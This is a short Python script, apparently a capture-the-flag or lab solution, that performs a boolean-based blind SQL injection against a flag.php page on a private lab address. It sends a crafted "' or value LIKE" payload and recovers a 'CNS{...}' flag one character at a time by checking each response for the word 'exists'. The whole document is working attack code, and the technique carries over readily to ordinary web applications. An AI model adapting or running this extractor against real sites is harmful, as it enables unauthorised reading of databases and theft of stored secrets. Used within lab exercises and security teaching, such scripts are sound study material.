#Blind SQL Injection
#Mackenzie Summers
#Run from Win10

import requests
 
def injection():
	url = "http://10.12.0.30/flag.php"
	character_set = "abcdefABCDEF0123456789"
	passwd = "CNS{"
	for num in range(32):
		for char in character_set:
			data = {"flag": "1' or value LIKE '{}{}%' #".format(passwd, char), "submit": ""}
			resp = requests.post(url, data=data)
			if "exists" in resp.text:
				passwd += char
				break
	print("Flag: {}".format(passwd +"}"))
print("\nBlind SQL Injection\n")
injection()
